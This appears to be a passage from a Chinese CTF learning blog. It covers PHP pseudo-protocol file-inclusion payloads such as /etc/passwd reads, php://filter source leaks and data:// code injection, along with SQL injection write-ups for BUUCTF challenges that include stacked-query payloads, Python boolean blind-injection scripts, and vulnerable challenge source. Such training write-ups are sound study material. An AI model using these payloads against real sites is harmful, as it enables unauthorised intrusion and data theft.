处理交互式的流</span><br></pre></td></tr></table></figure>
<p>在不同的伪协议中，需要allow_url_fopen和allow_url_include的开启状态是不同的</p>
<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 访问本地文件</span><br><span class="line"># 不受allow_url_fopen和allow_url_include影响</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswd #此处为绝对路径</span><br></pre></td></tr></table></figure>
<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>是一种元封装器，设计用于数据流打开时的筛选过滤应用<br>不受allow_url_open和allow_url_include影响</p>
<h4 id="四个参数"><a href="#四个参数" class="headerlink" title="四个参数"></a>四个参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</span><br><span class="line"># 把输入流进行base64编码</span><br></pre></td></tr></table></figure>
<p>转换过滤器：convert.base64-encode，convert.base64-decode</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>可以访问请求的原始数据的只读流，读取post中未解析的原始数据</p>
<p>需要allow_url_include开启</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 读取post数据</span><br><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;cmd.php?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>数据流封装器</p>
<p>需要allow_urul_ioncludeallow_url_include打开</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="zip-，bzip2-，zlib"><a href="#zip-，bzip2-，zlib" class="headerlink" title="zip://，bzip2://，zlib://"></a>zip://，bzip2://，zlib://</h2><p>用于打开压缩文件</p>
<p>不受allow_url_fopen和allow_url_include的影响</p>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;zip:&#x2F;&#x2F;C:\Users\liuxianglai\Desktop\test.jpg%23zip.txt</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxx.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;C:&#x2F;Users&#x2F;liuxianglai&#x2F;Desktop&#x2F;test.bz2</span><br></pre></td></tr></table></figure>
<h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;绝对路径%23要解压的文件&amp;参数1&#x3D;值1&amp;参数2&#x3D;值2</span><br><span class="line">?fp&#x3D;zip:&#x2F;&#x2F;xxx.png%23shell&amp;param1&#x3D;system&amp;param2&#x3D;pwd</span><br></pre></td></tr></table></figure>
<h2 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;相对路径&#x2F;phar</span><br><span class="line">?fp&#x3D;phar:&#x2F;&#x2F;xxx.png&#x2F;phar</span><br></pre></td></tr></table></figure>
<h2 id="可以输入数据的协议"><a href="#可以输入数据的协议" class="headerlink" title="可以输入数据的协议"></a>可以输入数据的协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input，之后post提交数据</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,xxx</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;palin;base64,xxx（base64编码）</span><br></pre></td></tr></table></figure>


<h2 id="还没学到的"><a href="#还没学到的" class="headerlink" title="还没学到的"></a>还没学到的</h2><p>包含日志</p>
<p>包含环境变量environ</p>
<p>利用session</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="ckkw052jk0001bsusa5z61ho8" data-title="CTF-Web-文件包含" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2021-01-20T00:47:08.000Z" itemprop="datePublished">2021-01-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/20/CTF-Web-SQL%E6%B3%A8%E5%85%A5/">CTF-Web-SQL注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>题目来源：强网杯2019</p>
<p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
<p>考察：堆叠注入，sql的show语句，sql的预编译，sql修改表</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chalan630/p/12583667.html%EF%BC%8Chttps://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">https://www.cnblogs.com/chalan630/p/12583667.html，https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</a></p>
<p>测试语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p>能够得出输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>
<p>时一样的回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39;   			# 报错</span><br><span class="line">1&#39;--+  			# 正常且为True</span><br><span class="line">1&#39; and 1&#x3D;1 --+  # 正常且为True</span><br><span class="line">1&#39; and 1&#x3D;2 --+  # 正常且为False</span><br><span class="line">?inject&#x3D;1&#39; order by 3--+ # error 1054 : Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br><span class="line">inject&#x3D;1&#39;; show tables; --+ $ # 1919810931114514 words</span><br><span class="line">?inject&#x3D;1&#39;; show columns from words; --+ # </span><br><span class="line">show columns from &#96;1919810931114514&#96;;--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words &#123;</span><br><span class="line">id int(10);</span><br><span class="line">data varchar(20);</span><br><span class="line">&#125;</span><br><span class="line">1919810931114514&#123;</span><br><span class="line">flag varchar(100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload1：修改表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;; rename table &#96;words&#96; to &#96;words1&#96;; rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(100) character set utf8 collate utf8_general_ci not null;--+</span><br></pre></td></tr></table></figure>
<p>payload2：预编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;Set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare s from @a; execute s; --+</span><br></pre></td></tr></table></figure>
<p>flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34745aea-2541-43e6-884f-c67988afc34a&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sql正常注入流程"><a href="#sql正常注入流程" class="headerlink" title="sql正常注入流程"></a>sql正常注入流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 # 正常输入</span><br><span class="line">1&#39; # 若报错，则单引号为可能的注入点</span><br><span class="line">1&#39; --+ # 判断注入类型</span><br><span class="line">1&#39; and 1&#x3D;1 --+ # 判断注入类型</span><br><span class="line">1&#39; and 1&#x3D;2 --+ # 判断注入类型</span><br><span class="line"></span><br><span class="line">1&#39; order by 3 --+ # 判断列数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="sql的show命令"><a href="#sql的show命令" class="headerlink" title="sql的show命令"></a>sql的show命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show table from db_name;</span><br><span class="line">show engine;</span><br><span class="line">show character set; #显示支持哪些字符集</span><br><span class="line">show columns;</span><br><span class="line">show create databases; #显示已经创建的库，创建时的语句</span><br><span class="line">show create table; #显示已经创建的表，创建时的语句</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="sql堆叠注入"><a href="#sql堆叠注入" class="headerlink" title="sql堆叠注入"></a>sql堆叠注入</h2><p>添加分号;即可实现同一行执行多个sql语句</p>
<h2 id="sql修改表"><a href="#sql修改表" class="headerlink" title="sql修改表"></a>sql修改表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table &#96;words&#96; to &#96;test&#96;;</span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);</span><br></pre></td></tr></table></figure>
<h2 id="sql预编译"><a href="#sql预编译" class="headerlink" title="sql预编译"></a>sql预编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SET;									# 用于设置变量名和值</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;	# 用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">EXECUTE stmt_name;			 			# 执行语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;	# 用来释放掉预处理的语句</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">set @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">execute stmt;</span><br></pre></td></tr></table></figure>
<h1 id="hack-world"><a href="#hack-world" class="headerlink" title="hack world"></a>hack world</h1><p>来源：[CISCN2019 华北赛区 Day2 Web1]</p>
<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World</a></p>
<p>参考：<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-Hack-world">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-Hack-world</a></p>
<p>考察：bool盲注</p>
<p>看到payload想骂脏话</p>
<p>尝试常规输入，1和2可以，之后都不行</p>
<p>尝试常规的注入，只有单引号时会返回bool(false)，应该提示bool型盲注吧</p>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure>
<p>由于1和2输出不同，根据这个进行注入即可</p>
<p><strong>可以通过一个字典，观察哪些字符被waf过滤</strong></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://a9e8a73f-f3d4-4ee4-a165-78c21730f40d.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">text1 = <span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">text2 = <span class="string">&quot;Do you want to be my girlfriend?&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">	<span class="comment"># print(&quot;debug&quot;)</span></span><br><span class="line">	flag = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		<span class="comment"># print(c)</span></span><br><span class="line">		s = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>, j) <span class="comment">#注意此处必须转成ascii码判断，因为sql中不区分大小写，直接判断字符会有双引号单引号大小写等问题</span></span><br><span class="line">		post_data = &#123;</span><br><span class="line">			<span class="string">&quot;id&quot;</span>: s</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment"># print(s)</span></span><br><span class="line">		response = requests.post(url, post_data)</span><br><span class="line">		<span class="keyword">if</span> text1 <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">			ans += c</span><br><span class="line">			print(c)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if(substr(select(flag)from(flag),&#123;&#125;,1)=&#123;&#125;,1,2)</span></span><br></pre></td></tr></table></figure>
<p>这个脚本比较慢，提高效率的方法有两个。一个是转换成ascii码查找（本题过滤了ord，因此只能用ascii进行转码），一个是range下限设置为32（’a’从32开始）</p>
<p>wp提供了一个二分脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn&#x2F;index.php&#39;</span><br><span class="line">flag &#x3D; &#39;Hello, glzjin wants a girlfriend.&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    sleep(1)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;.format(index&#x3D;i, char&#x3D;mid)</span><br><span class="line">        data &#x3D; &#123;&#39;id&#39;: payload&#125;</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h1 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h1><p>题目来源：[CISCN2019 华北赛区 Day1 Web5]</p>
<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk</a></p>
<p>考察：php伪协议，xpath报错注入，load_file</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12318551.html">https://www.cnblogs.com/wangtanzhi/p/12318551.html</a></p>
<p><strong>第一步</strong></p>
<p>首先进入页面，index界面可以用get的方式提交file参数，即可使用php伪协议直接读取源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p><strong>第二步</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   &#x2F;&#x2F;index.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class="line">        echo(&#39;no way!&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  &#x2F;&#x2F;change.php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;è®¢åä</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  &#x2F;&#x2F;search.php</span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;æªæ¾å°è®¢å!&quot;;</span><br></pre></td></tr></table></figure>
<p>发现在3个php中，都对user_name和pattern进行了过滤，因此只能在address上进行注入。</p>
<p>又注意到，只在change.php中对address执行了sql语句，而在search.php中，只是从数据库中返回了address的值。故这是一个二次注入，故操作在index.php和change.php中</p>
